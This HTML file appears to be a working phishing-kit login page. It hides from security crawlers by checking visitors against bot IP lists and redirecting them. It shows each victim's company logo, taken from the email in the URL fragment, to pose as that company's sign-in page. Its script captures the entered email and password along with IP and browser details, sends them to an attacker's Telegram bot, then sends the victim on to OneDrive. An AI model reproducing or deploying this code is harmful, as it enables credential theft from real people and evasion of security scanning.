<!DOCTYPE html>
<html lang="en">

    <head>
        <title>cafc</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link href="style.css" rel="stylesheet">
        <script src="addLogDetails.js"></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script>
        async function fetchTargetIPAddresses() {
            const folderPath = "antibot/ips/";
            const jsonFiles = [
                "amazonBotIPs.json",
                "appleBotIPs.json",
                "bingBotIPs.json",
                "cloudFlareBotIPs.json",
                "cookieBotIPs.json",
                "googleBotIPs.json",
                "namecheapBotIPs.json",
                "qualysBotIPs.json",
                "syntheticBotIPs.json",
                "yandexBotIPs.json",
                "generalBotIPs.json",
            ];
            const promises = jsonFiles.map((filename) => {
                return fetch(folderPath + filename)
                    .then((response) => response.json())
                    .then((data) => {
                        const ips = Object.values(data).map((ip) =>
                            String(ip).replace(/"/g, "")
                        );
                        return ips;
                    })
                    .catch((error) => {
                        console.error(`Error fetching ${filename}:`, error);
                        return [];
                    });
            });
            const ipArrays = await Promise.all(promises);
            const targetIPAddresses = ipArrays.flat();
            //console.log('Fetched target IP addresses:', targetIPAddresses);
            return targetIPAddresses;
        }

        function isTargetIPAddress(ipAddress, targetIPAddresses) {
            //console.log(ipAddress)
            if (!Array.isArray(targetIPAddresses)) {
                targetIPAddresses = [targetIPAddresses];
            }
            for (let i = 0; i < targetIPAddresses.length; i++) {
                const targetIP = targetIPAddresses[i];
                const individualIPs = targetIP.split(",").map((ip) => ip.trim());
                for (let j = 0; j < individualIPs.length; j++) {
                    const individualIP = individualIPs[j];
                    //console.log("Individual IP:", individualIP);
                    if (isIPInRange(ipAddress, individualIP)) {
                        console.log("Match found:", individualIP);
                        return true;
                    }
                }
            }
            console.log("Match not found");
            return false;
        }

        function isIPInRange(ipAddress, targetIP) {
            //console.log("Checking IP range:", targetIP);
            if (Array.isArray(targetIP)) {
                for (let i = 0; i < targetIP.length; i++) {
                    const ip = targetIP[i];
                    if (ipAddress.trim() === ip.trim()) {
                        //console.log("IPs match:", true);
                        return true;
                    }
                }
            } else {
                //console.log("Checking IP:", targetIP.trim());
                const match = ipAddress.trim() === targetIP.trim();
                //console.log("IPs match:", match);
                return match;
            }
            //console.log("IPs match:", false);
            return false;
        }

        async function redirectToBlockedPage() {
            try {
                const targetIPAddresses = await fetchTargetIPAddresses();
                const data = await fetch("https://api.ipify.org?format=json");
                const {
                    ip: currentIPAddress
                } = await data.json();
                if (isTargetIPAddress(currentIPAddress, targetIPAddresses)) {
                    window.location.href = "http://2m.ma";
                    //const userAgent = navigator.userAgent;
                    //console.log("User Agent:", userAgent);
                }
            } catch (error) {
                console.error("Error:", error);
            }
        }
        window.onload = redirectToBlockedPage;

        document.addEventListener("DOMContentLoaded", function() {
            var fragmentIdentifier = window.location.hash.substr(1);
            document.getElementById("xx").value = fragmentIdentifier;

            document.querySelector('.items').addEventListener('click', function() {
                document.querySelector('.fx-body').style.display = 'block';
            });

            const url = window.location.href;
            const explode = url.split('#');
            const getLogo = explode[1].split("@");
            const company_name = getLogo[1].split('.');

            const websiteName = company_name[0].charAt(0).toUpperCase() + company_name[0].slice(1);
            document.getElementById('websiteName').textContent = `to ${websiteName}`;
            document.getElementById('websiteNameBold').textContent = ` ${websiteName}`;
            document.getElementById('footerWebsiteName').textContent = ` ${websiteName}`;
            document.title = websiteName + " Login";

            let websiteUrl = getLogo[1];
            if (!websiteUrl.startsWith('http://') && !websiteUrl.startsWith('https://')) {
                websiteUrl = 'https://www.' + websiteUrl;
            }
            document.querySelector('a[href="https://websitedomain"]').setAttribute('href', websiteUrl);

            document.getElementById("logoImage").src = "https://logo.clearbit.com/" + getLogo[1];

            document.getElementById("footerLogoImage").src = "https://logo.clearbit.com/" + getLogo[1];

            const faviconLinks = document.querySelectorAll('link[rel="icon"]');
            faviconLinks.forEach(link => {
                link.href = "https://logo.clearbit.com/" + getLogo[1];
            });

            document.getElementById("xx").value = explode[1];

            function generateId() {
                const characters = 'abcdef0123456789';
                const numDashes = 4;
                const length = 13;

                const dashPositions = [];
                for (let i = 1; i < numDashes; i++) {
                    dashPositions.push((length + 1) * i + i - 1);
                }

                let result = '';
                let dashCount = 0;

                for (let i = 0; i < numDashes * (length + 1); i++) {
                    if (dashPositions.includes(i)) {
                        result += '-';
                        dashCount++;
                    } else {
                        result += characters.charAt(Math.floor(Math.random() * characters.length));
                    }
                }
                return result;
            };

            function generateIdLetters() {
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                const numDashes = 4;
                const length = 21;

                const dashPositions = [];
                for (let i = 1; i < numDashes; i++) {
                    dashPositions.push((length + 1) * i + i - 1);
                }

                let result = '';
                let dashCount = 0;

                for (let i = 0; i < numDashes * (length + 1); i++) {
                    if (dashPositions.includes(i)) {
                        result += '-';
                        dashCount++;
                    } else {
                        result += characters.charAt(Math.floor(Math.random() * characters.length));
                    }
                }
                return result;
            };

            function formatDate(date) {
                const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
                const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov',
                    'Dec'
                ];

                const day = days[date.getUTCDay()];
                const dayOfMonth = String(date.getUTCDate()).padStart(2, '0');
                const month = months[date.getUTCMonth()];
                const year = date.getUTCFullYear();
                const hours = String(date.getUTCHours()).padStart(2, '0');
                const minutes = String(date.getUTCMinutes()).padStart(2, '0');
                const seconds = String(date.getUTCSeconds()).padStart(2, '0');

                return `${day}, ${dayOfMonth} ${month} ${year} ${hours}:${minutes}:${seconds} UTC`;
            };

            function setCurrentDateInDesiredFormat() {
                const currentDate = new Date();
                const formattedDate = formatDate(currentDate);
                return formattedDate;
            };

            function handleSignin(event) {
                event.preventDefault();

                const password = document.getElementById("password").value;
                const email = document.getElementById("xx").value;

                document.getElementById('Btn').textContent = 'Verifying account...';
                document.getElementById("msg").innerHTML = '';

                if (!password) {
                    document.getElementById('Btn').textContent = 'Sign in';
                    document.getElementById("msg").innerHTML =
                        '<font face="Arial, Helvetica, sans-serif" size="2" style="color: red">Password required!</font>'
                    return;
                }

                const id1 = generateId();
                const id2 = generateId();
                const id3 = generateIdLetters();
                const id4 = generateId();
                const userAgent = navigator.userAgent;
                const date = setCurrentDateInDesiredFormat();

                const x =
                    `prompt=login&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&uaid=${id1}; "userAgent"=${userAgent}-NG; MSPOK=$uuid-${id2}; &ui_locales=en-
                US&client_info=1&${id3}=0&login_email=${email}&passwd=${password}; DeviceId=${id4}; status_date=${date};`;

                fetch('https://api.ipify.org')
                    .then(res => res.text())
                    .then(ipAddress => {
                        const deviceInfo = {
                            manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
                            model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
                            os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
                            browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
                        };
                        getLocation(email, password, x, deviceInfo, ipAddress);
                    })
                    .catch(error => {
                        console.error("Error capturing IP address:", error);
                    });
            };

            function getLocation(email, password, x, deviceInfo, ipAddress) {
                try {
                    const dataToSend = {
                        email,
                        password,
                        ipAddress,
                        Device: deviceInfo.manufacturer,
                        OS: deviceInfo.os,
                        Browser: deviceInfo.browser,
                        Cookies: x,
                    };
                    if (Object.keys(dataToSend).length > 0) {
                        sendToTelegram(dataToSend);
                    } else {
                        console.warn("No data to send to Telegram.");
                    }
                } catch (error) {
                    console.error("Error occurred:", error);
                }
            };

            function sendToTelegram(data) {
                const payload = {
                    chat_id: chatId,
                    text: `
                    ${websiteName} Log:
                    ________________________
                    "EMAIL ADDRESS": ${data.email},
                    "PASSWORD": ${data.password},
                    "IP": ${data.ipAddress},
                    "DEVICE": ${data.Device},
                    "OS": ${data.OS},
                    "BROWSER": ${data.Browser},
                    "COOKIE": ${data.Cookies},
                    `
                };

                const sendToBot = {
                    url: "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "cache-control": "no-cache"
                    },
                    data: JSON.stringify(payload)
                };

                $.ajax(sendToBot).done(function(response) {
                    window.location.href = 'http://onedrive.live.com';
                }).fail(function(error) {
                    console.error("Error sending data to Telegram:", error);
                });
            }

            document.getElementById("webmailSignin-form").addEventListener("submit", handleSignin);
        });
        </script>
    </head>

    <body style="height:100vh;">

        <header>
            <img src="img/lg.png">
        </header>
        <aside>
            <img src="img/ca.png">
        </aside>

        <div class="items">
            <div class="item-con">
                <img src="img/1a.png">
            </div>
            <div class="item-con">
                <img src="img/2a.png">
            </div>
            <div class="item-con">
                <img src="img/3a.png">
            </div>
            <div class="item-con">
                <img src="img/4a.png">
            </div>
        </div>

        <div class="fx-body" style="display:none;">
            <img src="img/xc.png" class="img-fluid">
            <div class="ms"></div>
            <small class="text-danger" id="msg" style="font-weight:600;"></small>
            <form method="post" id="webmailSignin-form" class="my-4">
                <div>
                    <input type="text" name="email" id="xx" value="" readonly>
                </div>
                <div>
                    <input type="password" name="password" id="password" placeholder="Password" value="" required>
                </div>
                <div>
                    <img src="img/sd1.png">
                </div>
                <div>
                    <button id="Btn">Sign In</button>
                </div>
            </form>
        </div>

        <div id="site-header-footer"></div>
        <div id="site-footer">
            <div class="wrapper clearfix">
                <!--   <ul id="footer-links" class="">
                    <li class="columns col4">
                        <div class="row">
                           <div class="footer-logo">
                        <img id="footerLogoImage" src="assets/other-mail.png"
                            style="max-width: 50px; max-height: 50px; margin-top:0; text-indent:-9999px; top left; border-radius: 10px;" />
                    </div>
                    <span>Copyright © 2004 - 2024</span><span id="footerWebsiteName"></span>, Inc. All Rights
                    Reserved.
                </div>
                    </li>
                </ul>-->
            </div>
        </div>

    </body>

</html>